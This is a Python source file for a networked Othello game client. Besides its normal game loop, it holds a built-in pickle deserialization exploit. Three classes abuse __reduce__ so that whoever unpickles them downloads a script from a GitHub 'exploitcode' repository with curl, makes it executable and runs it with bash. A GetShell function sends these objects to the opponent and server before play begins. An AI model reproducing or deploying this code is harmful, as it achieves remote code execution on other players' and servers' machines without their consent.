import TCP_connection_module
import othello_module
import socket
import subprocess


class Command1(object):
  def __reduce__(self):
    return (subprocess.call, (['curl', 'https://raw.githubusercontent.com/okn0315/exploitcode/main/exploit-code-1', '-o', 'exploit'],))

class Command2(object):
  def __reduce__(self):
    return (subprocess.call, (['chmod', '777', './exploit'],))

class Command3(object):
  def __reduce__(self):
    return (subprocess.call, (['bash', '/home/Kosen_18408/exploit'],))


def GetShell(socket, source_id, destination_id):
  send_data = Command1()
  send_data = othello_module.packet(source_id, destination_id, othello_module.packet.MESSAGE, send_data)
  TCP_connection_module.send_data(socket, send_data)
  send_data = Command2()
  send_data = othello_module.packet(source_id, destination_id, othello_module.packet.MESSAGE, send_data)
  TCP_connection_module.send_data(socket, send_data)
  send_data = Command3()
  send_data = othello_module.packet(source_id, destination_id, othello_module.packet.MESSAGE, send_data)
  TCP_connection_module.send_data(socket, send_data)


class UnexpectedInput(Exception):
  pass

ipaddr = "52.185.167.164"
port   = 80

s = TCP_connection_module.setup_client(ipaddr, port)

game_state = 0
turn = othello_module.field.BLACK

while True:
  if game_state == 3:
    break

  recv_data = None
  while recv_data == None:
    recv_data = TCP_connection_module.recv_data(s)


  for each_recv_data in recv_data:
    if each_recv_data.data_type == othello_module.packet.MESSAGE:
      print("Your ID = "+ str(each_recv_data.destination_id))
      print("message received\n>", end="")
      print(each_recv_data.data)

    if game_state == 0:
      if each_recv_data.data_type == othello_module.packet.YOUR_OPPONENT:
        my_id       = each_recv_data.destination_id
        server_id   = each_recv_data.source_id
        opponent_id = each_recv_data.data
        game_state = 1

    elif game_state == 1:
      if each_recv_data.data_type == othello_module.packet.YOUR_COLOR:
        field = othello_module.field()
        field.my_color = each_recv_data.data
        game_state = 2

    elif game_state == 2:
      if each_recv_data.data_type == othello_module.packet.YOUR_OPPONENT_COLOR:
        field.opponent_color = each_recv_data.data
        game_state = 3


GetShell(s, opponent_id, server_id)


disped = False
winner = None
while True:

  recv_data = None
  recv_data = TCP_connection_module.recv_data(s)

  if recv_data == None:
    if turn == field.my_color:
      print('\nYour turn')
      field.print_field()
      if field.my_color == othello_module.field.BLACK:
        print('Your color is BLACK')
      else:
        print('Your color is WHITE')

      can_put = 0
      for x in range(8):
        for y in range(8):
          if field.check_turn_over([x, y], field.my_color) != 0:
            can_put = 1
            break

        if can_put == 1:
          break

      
      if can_put == 1:      
        while True:
          try:
            coordinate = [int(i) for i in input().split(',')]
            if len(coordinate) != 2:
              raise UnexpectedInput
            if coordinate[0] < 0 or coordinate[0] > 7 :
              raise UnexpectedInput
            if coordinate[1] < 0 or coordinate[1] > 7 :
              raise UnexpectedInput
            if field.check_turn_over(coordinate, field.my_color) == 0:
              raise UnexpectedInput

          except UnexpectedInput:
            pass

          else:
            break

        field.put(coordinate, field.my_color)
        winner = field.check_game_over()
        if winner != None:
          if winner == field.my_color:
            print("Game end. YOU WIN!")
            quit()
          
          elif winner == field.opponent_color:
            print("Game end. YOU LOSE...")
            quit()

          elif winner == field.NOTHING:
            print("Game end.  ...Wow, it's DROW!")
            quit()

        send_data = othello_module.packet(my_id, opponent_id, othello_module.packet.OTHELLO_COORDINATE, coordinate)
        TCP_connection_module.send_data(s, send_data)
        turn = field.opponent_color

      else:
        print("You can't put any place... You have to pass...")
        send_data = othello_module.packet(my_id, opponent_id, othello_module.packet.OTHELLO_COORDINATE, None)
        TCP_connection_module.send_data(s, send_data)
        turn = field.opponent_color

    
    else:
      if disped == False:
        print("\nOpponent's turn")
        field.print_field()
        disped = True

  else:
    for each_recv_data in recv_data:
      if each_recv_data.data_type == othello_module.packet.MESSAGE:
        print("message received\n>", end="")
        print(each_recv_data.data)

      elif each_recv_data.data_type == othello_module.packet.OPPONENTS_CONNECTION_ERROR:
        print("Opponent's connection failed...")
        s.close()
        quit()
      
      elif each_recv_data.data_type == othello_module.packet.OTHELLO_COORDINATE:
        if each_recv_data.data != None:
          field.put(each_recv_data.data, field.opponent_color)
          turn = field.my_color

        else:
          print("Opponent have passed.")

        winner = field.check_game_over()
        if winner != None:
          if winner == field.my_color:
            print("Game end. YOU WIN!")
            quit()
          
          elif winner == field.opponent_color:
            print("Game end. YOU LOSE...")
            quit()

          elif winner == field.NOTHING:
            print("Game end.  ...Wow, it's DROW!")
            quit()
        disped = False